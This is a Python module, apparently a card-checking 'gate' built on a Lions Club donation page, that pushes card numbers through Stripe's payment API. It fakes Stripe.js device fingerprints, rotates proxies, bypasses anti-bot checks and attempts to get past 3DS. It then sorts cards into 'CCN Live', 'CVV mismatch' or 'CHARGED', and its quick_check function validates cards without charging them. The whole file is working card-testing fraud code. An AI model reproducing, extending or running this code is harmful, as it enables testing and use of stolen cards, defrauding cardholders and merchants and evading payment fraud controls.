"""
Stripe Live Flow - Reusable Stripe Payment Processing Helper
Extracted from working Lions Club gate implementation

This module provides the complete Stripe payment flow:
1. Device fingerprinting (muid, sid, guid)
2. Payment Method creation with fingerprint
3. Payment Intent confirmation with 3DS handling
4. Response parsing and error classification

Usage:
    from gates.stripe_live_flow import StripeFlow
    
    flow = StripeFlow(stripe_pk, proxy=proxy_dict)
    result = flow.process_payment(card_num, card_mon, card_yer, card_cvc)
"""

import requests
import json
import base64
import random
import time
from typing import Tuple, Optional, Dict, Any
from urllib.parse import quote_plus

try:
    import cloudscraper
    HAS_CLOUDSCRAPER = True
except ImportError:
    cloudscraper = None
    HAS_CLOUDSCRAPER = False


from enum import Enum


class StripeStatus(Enum):
    """Structured response status for Stripe operations."""
    APPROVED = "approved"
    DECLINED = "declined"
    CVV_ISSUE = "cvv_issue"
    INSUFFICIENT_FUNDS = "insufficient_funds"
    EXPIRED = "expired"
    THREE_DS_REQUIRED = "3ds_required"
    ERROR = "error"


class StripeResult:
    """Structured result from Stripe operations."""
    def __init__(self, status: StripeStatus, message: str, data: dict = None):
        self.status = status
        self.message = message
        self.data = data or {}
    
    @property
    def success(self) -> bool:
        return self.status in [StripeStatus.APPROVED, StripeStatus.THREE_DS_REQUIRED]
    
    def to_string(self) -> str:
        """Convert to user-facing string format."""
        status_map = {
            StripeStatus.APPROVED: "CHARGED",
            StripeStatus.DECLINED: "DECLINED",
            StripeStatus.CVV_ISSUE: "CVV MISMATCH - CCN Live",
            StripeStatus.INSUFFICIENT_FUNDS: "INSUFFICIENT FUNDS - CCN Live",
            StripeStatus.EXPIRED: "DECLINED - Card Expired",
            StripeStatus.THREE_DS_REQUIRED: "CCN LIVE - 3DS Required",
            StripeStatus.ERROR: "Error",
        }
        prefix = status_map.get(self.status, "DECLINED")
        if self.message:
            return f"{prefix} - {self.message}"
        return prefix


class StripeFlow:
    """
    Reusable Stripe payment flow with device fingerprinting.
    Based on proven Lions Club gate implementation.
    
    Returns session with fingerprint cookies for downstream use.
    """
    
    STRIPE_FINGERPRINT_URL = "https://m.stripe.com/6"
    STRIPE_PAYMENT_METHODS_URL = "https://api.stripe.com/v1/payment_methods"
    STRIPE_TOKENS_URL = "https://api.stripe.com/v1/tokens"
    STRIPE_3DS_AUTH_URL = "https://api.stripe.com/v1/3ds2/authenticate"
    
    DEFAULT_FINGERPRINT_PAYLOAD = "JTdCJTIydjIlMjIlM0ExJTJDJTIyaWQlMjIlM0ElMjJkODVlNThhNmQwOTRlMzViMTExODI3YWY1Yjc0ZjE5NSUyMiUyQyUyMnQlMjIlM0E2MCUyQyUyMnRhZyUyMiUzQSUyMjQuNS40MyUyMiUyQyUyMnNyYyUyMiUzQSUyMmpzJTIyJTJDJTIyYSUyMiUzQSU3QiUyMmElMjIlM0ElN0IlMjJ2JTIyJTNBJTIyZmFsc2UlMjIlMkMlMjJ0JTIyJTNBMCU3RCUyQyUyMmIlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyZmFsc2UlMjIlMkMlMjJ0JTIyJTNBMCU3RCUyQyUyMmMlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyZW4tQ0ElMjIlMkMlMjJ0JTIyJTNBMCU3RCUyQyUyMmQlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyaVBob25lJTIyJTJDJTIydCUyMiUzQTAlN0QlN0QlN0Q="
    
    def __init__(self, stripe_pk: str, proxy: dict = None, use_cloudscraper: bool = False, timeout: int = 20):
        """
        Initialize Stripe flow handler.
        
        Args:
            stripe_pk: Stripe publishable key (pk_live_xxx or pk_test_xxx)
            proxy: Optional proxy dict {'http': ..., 'https': ...}
            use_cloudscraper: Use cloudscraper for anti-bot bypass
            timeout: Request timeout in seconds
        """
        self.stripe_pk = stripe_pk
        self.proxy = proxy
        self.proxies = {'http': proxy, 'https': proxy} if isinstance(proxy, str) else proxy
        self.timeout = timeout
        self.use_cloudscraper = use_cloudscraper and HAS_CLOUDSCRAPER
        
        self.muid = None
        self.sid = None
        self.guid = None
        self.session = None
        self.ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1"
    
    def _create_session(self) -> requests.Session:
        """Create a session with optional cloudscraper support."""
        if self.use_cloudscraper and HAS_CLOUDSCRAPER:
            session = cloudscraper.create_scraper(
                browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}
            )
        else:
            session = requests.Session()
        
        session.headers.update({
            'User-Agent': self.ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
        })
        return session
    
    def get_fingerprint(self) -> Tuple[bool, str]:
        """
        Get Stripe device fingerprint (muid, sid, guid).
        
        Returns:
            Tuple of (success, error_message)
        """
        if self.session is None:
            self.session = self._create_session()
        
        headers = {
            'User-Agent': self.ua,
            'Content-Type': "text/plain",
            'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-mobile': "?1",
            'origin': "https://m.stripe.network",
            'referer': "https://m.stripe.network/"
        }
        
        try:
            resp = self.session.post(
                self.STRIPE_FINGERPRINT_URL,
                data=self.DEFAULT_FINGERPRINT_PAYLOAD,
                headers=headers,
                timeout=15,
                proxies=self.proxies
            )
            data = resp.json()
            
            self.muid = data.get("muid", "")
            self.sid = data.get("sid", "")
            self.guid = data.get("guid", "")
            
            if not self.muid or not self.sid:
                return False, "Failed to get fingerprint IDs"
            
            return True, ""
            
        except requests.exceptions.ProxyError:
            return False, "Proxy connection failed"
        except requests.exceptions.Timeout:
            return False, "Fingerprint request timeout"
        except Exception as e:
            return False, f"Fingerprint failed: {str(e)}"
    
    def create_payment_method(self, card_num: str, card_mon: str, card_yer: str, 
                              card_cvc: str, billing_name: str = None,
                              billing_email: str = None, referrer: str = None) -> Tuple[Optional[str], str]:
        """
        Create a Stripe Payment Method with fingerprint data.
        
        Args:
            card_num: Card number
            card_mon: Expiry month (MM)
            card_yer: Expiry year (YY or YYYY)
            card_cvc: CVV/CVC
            billing_name: Cardholder name (optional)
            billing_email: Email address (optional)
            referrer: Referrer URL for payment_user_agent (optional)
        
        Returns:
            Tuple of (payment_method_id or None, error_message)
        """
        if self.session is None:
            self.session = self._create_session()
        
        if not self.muid:
            success, err = self.get_fingerprint()
            if not success:
                return None, err
        
        headers = {
            'User-Agent': self.ua,
            'Accept': "application/json",
            'Content-Type': "application/x-www-form-urlencoded",
            'origin': "https://js.stripe.com",
            'referer': "https://js.stripe.com/"
        }
        
        ref_url = quote_plus(referrer or "https://checkout.stripe.com")
        
        payload = (
            f"type=card"
            f"&card[number]={card_num}"
            f"&card[cvc]={card_cvc}"
            f"&card[exp_month]={card_mon}"
            f"&card[exp_year]={card_yer}"
            f"&guid={self.guid}"
            f"&muid={self.muid}"
            f"&sid={self.sid}"
            f"&pasted_fields=number"
            f"&payment_user_agent=stripe.js%2Fd80a055d16"
            f"&referrer={ref_url}"
            f"&time_on_page={random.randint(50000, 90000)}"
            f"&key={self.stripe_pk}"
        )
        
        if billing_name:
            payload += f"&billing_details[name]={quote_plus(billing_name)}"
        if billing_email:
            payload += f"&billing_details[email]={quote_plus(billing_email)}"
        
        try:
            resp = self.session.post(
                self.STRIPE_PAYMENT_METHODS_URL,
                data=payload,
                headers=headers,
                timeout=self.timeout,
                proxies=self.proxies
            )
            data = resp.json()
            
            if 'error' in data:
                return None, self._parse_stripe_error(data)
            
            pm_id = data.get('id')
            if not pm_id:
                return None, "No payment method ID in response"
            
            return pm_id, ""
            
        except requests.exceptions.ProxyError:
            return None, "Proxy connection failed"
        except requests.exceptions.Timeout:
            return None, "Payment method creation timeout"
        except Exception as e:
            return None, f"Payment method error: {str(e)}"
    
    def create_token(self, card_num: str, card_mon: str, card_yer: str,
                     card_cvc: str, billing_name: str = None,
                     billing_address: dict = None) -> Tuple[Optional[str], str]:
        """
        Create a Stripe Token (older API, for legacy integrations).
        
        Returns:
            Tuple of (token_id or None, error_message)
        """
        if self.session is None:
            self.session = self._create_session()
        
        if not self.muid:
            success, err = self.get_fingerprint()
            if not success:
                return None, err
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/'
        }
        
        payload = (
            f"card[number]={card_num}"
            f"&card[cvc]={card_cvc}"
            f"&card[exp_month]={card_mon}"
            f"&card[exp_year]={card_yer}"
            f"&guid={self.guid or random.randint(100000, 999999)}"
            f"&muid={self.muid or random.randint(100000, 999999)}"
            f"&sid={self.sid or random.randint(100000, 999999)}"
            f"&payment_user_agent=stripe.js/v3"
            f"&time_on_page={random.randint(50000, 90000)}"
            f"&key={self.stripe_pk}"
        )
        
        if billing_name:
            payload += f"&card[name]={quote_plus(billing_name)}"
        
        if billing_address:
            if billing_address.get('line1'):
                payload += f"&card[address_line1]={quote_plus(billing_address['line1'])}"
            if billing_address.get('city'):
                payload += f"&card[address_city]={quote_plus(billing_address['city'])}"
            if billing_address.get('state'):
                payload += f"&card[address_state]={billing_address['state']}"
            if billing_address.get('zip'):
                payload += f"&card[address_zip]={billing_address['zip']}"
            if billing_address.get('country'):
                payload += f"&card[address_country]={billing_address['country']}"
        
        try:
            resp = self.session.post(
                self.STRIPE_TOKENS_URL,
                data=payload,
                headers=headers,
                timeout=self.timeout,
                proxies=self.proxies
            )
            data = resp.json()
            
            if 'error' in data:
                return None, self._parse_stripe_error(data)
            
            token_id = data.get('id')
            if not token_id:
                return None, "No token ID in response"
            
            return token_id, ""
            
        except requests.exceptions.ProxyError:
            return None, "Proxy connection failed"
        except requests.exceptions.Timeout:
            return None, "Token creation timeout"
        except Exception as e:
            return None, f"Token error: {str(e)}"
    
    def confirm_payment_intent(self, payment_intent_id: str, pm_id: str,
                                client_secret: str = None) -> Tuple[str, bool]:
        """
        Confirm a Stripe Payment Intent with the payment method.
        Handles 3DS authentication automatically.
        
        Args:
            payment_intent_id: Payment Intent ID (pi_xxx)
            pm_id: Payment Method ID (pm_xxx)
            client_secret: Client secret for the payment intent (optional)
        
        Returns:
            Tuple of (status_message, success)
        """
        if self.session is None:
            self.session = self._create_session()
        
        headers = {
            'Host': 'api.stripe.com',
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'User-Agent': self.ua,
            'Referer': 'https://js.stripe.com/'
        }
        
        payload = (
            f"payment_method={pm_id}"
            f"&expected_payment_method_type=card"
            f"&use_stripe_sdk=true"
            f"&key={self.stripe_pk}"
        )
        
        if client_secret:
            payload += f"&client_secret={client_secret}"
        
        try:
            resp = self.session.post(
                f"https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm",
                data=payload,
                headers=headers,
                timeout=self.timeout,
                proxies=self.proxies
            )
            data = resp.json()
            
            return self._parse_confirm_response(data)
            
        except requests.exceptions.ProxyError:
            return "Error: Proxy connection failed", False
        except requests.exceptions.Timeout:
            return "Error: Confirmation timeout", False
        except Exception as e:
            return f"Error: {str(e)}", False
    
    def _parse_confirm_response(self, data: Dict[str, Any]) -> Tuple[str, bool]:
        """Parse payment intent confirmation response."""
        status = data.get('status', '')
        
        if status == 'succeeded':
            amount = data.get('amount', 0)
            currency = data.get('currency', 'usd').upper()
            amount_str = f"${amount/100:.2f}" if currency == 'USD' else f"{amount/100:.2f} {currency}"
            return f"CHARGED - {amount_str}", True
        
        if status in ['requires_action', 'requires_source_action']:
            next_action = data.get('next_action', {})
            action_type = next_action.get('type', '')
            
            if 'three_d_secure' in action_type or '3ds' in str(next_action).lower():
                return self._handle_3ds(next_action)
            
            return "CCN LIVE - Additional verification required", True
        
        if status == 'requires_payment_method':
            error = data.get('last_payment_error', {})
            return self._parse_decline_error(error), False
        
        if 'error' in data:
            return self._parse_stripe_error(data), False
        
        return f"Unknown status: {status}", False
    
    def _handle_3ds(self, next_action: Dict[str, Any]) -> Tuple[str, bool]:
        """Handle 3DS authentication challenge."""
        try:
            tds_data = next_action.get('use_stripe_sdk', {})
            server_trans_id = tds_data.get('server_transaction_id', '')
            tds_source = tds_data.get('three_d_secure_2_source', '')
            
            if not server_trans_id or not tds_source:
                return "CCN LIVE - 3DS Required (Not Charged)", True
            
            fingerprint_json = json.dumps({"threeDSServerTransID": server_trans_id})
            fingerprint_data = base64.b64encode(fingerprint_json.encode()).decode()
            
            auth_payload = (
                f"source={tds_source}"
                f"&browser=%7B%22fingerprintAttempted%22%3Atrue%2C%22fingerprintData%22%3A%22{fingerprint_data}%22"
                f"%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22"
                f"%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue"
                f"%2C%22browserLanguage%22%3A%22en-GB%22%2C%22browserColorDepth%22%3A%2224%22"
                f"%2C%22browserScreenHeight%22%3A%22852%22%2C%22browserScreenWidth%22%3A%22393%22"
                f"%2C%22browserTZ%22%3A%22-120%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0%22%7D"
                f"&one_click_authn_device_support[hosted]=false"
                f"&one_click_authn_device_support[same_origin_frame]=false"
                f"&one_click_authn_device_support[spc_eligible]=false"
                f"&one_click_authn_device_support[webauthn_eligible]=true"
                f"&one_click_authn_device_support[publickey_credentials_get_allowed]=false"
                f"&key={self.stripe_pk}"
            )
            
            headers = {
                'User-Agent': self.ua,
                'Accept': "application/json",
                'Content-Type': "application/x-www-form-urlencoded",
                'origin': "https://js.stripe.com",
                'referer': "https://js.stripe.com/"
            }
            
            auth_resp = self.session.post(
                self.STRIPE_3DS_AUTH_URL,
                data=auth_payload,
                headers=headers,
                timeout=15,
                proxies=self.proxies
            )
            auth_data = auth_resp.json()
            
            state = auth_data.get('state', '')
            if state == 'succeeded':
                return "CHARGED - 3DS Verified", True
            elif state == 'challenge_required':
                return "CCN LIVE - 3DS Challenge Required", True
            elif 'failed' in state.lower():
                return "DECLINED - 3DS Authentication Failed", False
            
        except Exception:
            pass
        
        return "CCN LIVE - 3DS Required (Not Charged)", True
    
    def _parse_stripe_error(self, data: Dict[str, Any]) -> str:
        """Parse Stripe API error response."""
        error = data.get('error', {})
        message = error.get('message', 'Unknown error')
        code = error.get('code', '')
        decline_code = error.get('decline_code', '')
        
        msg_lower = message.lower()
        
        if 'expired' in msg_lower:
            return "DECLINED - Card Expired"
        if 'cvc' in msg_lower or 'cvv' in msg_lower or 'security code' in msg_lower:
            return "CVV MISMATCH - CCN Live"
        if 'insufficient' in msg_lower:
            return "INSUFFICIENT FUNDS - CCN Live"
        if decline_code:
            return f"DECLINED - {decline_code.replace('_', ' ').title()}"
        if 'invalid' in msg_lower or 'incorrect' in msg_lower:
            return f"DECLINED - {message}"
        
        return f"DECLINED - {message}"
    
    def _parse_decline_error(self, error: Dict[str, Any]) -> str:
        """Parse payment decline error."""
        decline_code = error.get('decline_code', '')
        message = error.get('message', 'Card declined')
        
        code_map = {
            'insufficient_funds': 'INSUFFICIENT FUNDS - CCN Live',
            'incorrect_cvc': 'CVV MISMATCH - CCN Live',
            'expired_card': 'DECLINED - Card Expired',
            'stolen_card': 'DECLINED - Stolen Card',
            'lost_card': 'DECLINED - Lost Card',
            'do_not_honor': 'DECLINED - Do Not Honor',
            'generic_decline': 'DECLINED - Card Declined',
            'card_not_supported': 'DECLINED - Card Not Supported',
            'currency_not_supported': 'DECLINED - Currency Not Supported',
            'fraudulent': 'DECLINED - Fraud Detected',
        }
        
        if decline_code in code_map:
            return code_map[decline_code]
        
        return f"DECLINED - {message}"
    
    def get_stripe_cookies(self) -> str:
        """Get Stripe fingerprint cookies for use in requests."""
        if self.muid and self.sid:
            return f"__stripe_mid={self.muid}; __stripe_sid={self.sid}"
        return ""
    
    def get_session(self) -> requests.Session:
        """
        Get the session with Stripe fingerprint cookies.
        Use this session for downstream merchant requests to maintain cookies.
        """
        if self.session is None:
            self.session = self._create_session()
        return self.session
    
    def apply_cookies_to_session(self, session: requests.Session) -> None:
        """
        Apply Stripe fingerprint cookies to an existing session.
        Call this after get_fingerprint() to add cookies to your session.
        """
        if self.muid:
            session.cookies.set('__stripe_mid', self.muid)
        if self.sid:
            session.cookies.set('__stripe_sid', self.sid)


def quick_check(stripe_pk: str, card_num: str, card_mon: str, card_yer: str,
                card_cvc: str, proxy: dict = None) -> Tuple[str, bool]:
    """
    Quick card check using Payment Method creation.
    This only validates that Stripe accepts the card details.
    Does NOT actually charge the card.
    
    Returns:
        Tuple of (status_message, proxy_alive)
    """
    flow = StripeFlow(stripe_pk, proxy=proxy)
    
    pm_id, error = flow.create_payment_method(card_num, card_mon, card_yer, card_cvc)
    
    if error:
        if 'DECLINED' in error or 'CVV' in error or 'INSUFFICIENT' in error:
            return error, True
        return f"Error: {error}", False
    
    return f"CCN LIVE - Payment Method Created ({pm_id[:20]}...)", True
